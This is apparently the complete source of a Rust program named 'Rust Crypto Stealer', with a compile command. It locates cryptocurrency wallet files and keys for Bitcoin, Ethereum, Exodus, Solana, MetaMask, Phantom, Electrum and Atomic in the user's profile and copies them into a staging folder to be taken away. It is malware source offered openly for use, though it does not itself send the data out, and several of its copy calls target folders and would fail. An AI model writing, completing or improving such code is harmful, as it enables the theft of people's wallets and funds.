// stealer.rs - Rust Crypto Stealer
// Compile: rustc -C opt-level=3 stealer.rs -o stealer.exe

use std::fs;
use std::path::PathBuf;
use std::env;

fn main() {
    let user_profile = env::var("USERPROFILE").unwrap_or_else(|_| String::from("C:\\Users\\Default"));
    let output_dir = PathBuf::from(r"C:\StealerData\crypto");
    fs::create_dir_all(&output_dir).unwrap();

    let wallet_paths = vec![
        r"\AppData\Roaming\Bitcoin\wallet.dat",
        r"\AppData\Roaming\Ethereum\keystore",
        r"\AppData\Roaming\Exodus\exodus.wallet",
        r"\.bitcoin\wallet.dat",
        r"\.solana\id.json",
        r"\AppData\Roaming\MetaMask",
        r"\AppData\Roaming\Phantom",
    ];

    for rel_path in wallet_paths {
        let full_path = PathBuf::from(&user_profile).join(rel_path.trim_start_matches('\\'));
        if full_path.exists() {
            let dest = output_dir.join(full_path.file_name().unwrap());
            let _ = fs::copy(&full_path, &dest);
        }
    }

    // Copy thêm Electrum, Atomic, Binance
    let extra = vec![
        r"\AppData\Roaming\Electrum\wallets",
        r"\AppData\Roaming\atomic",
    ];
    for p in extra {
        let src = PathBuf::from(&user_profile).join(p.trim_start_matches('\\'));
        if src.exists() {
            let _ = fs::copy(&src, output_dir.join(src.file_name().unwrap()));
        }
    }
}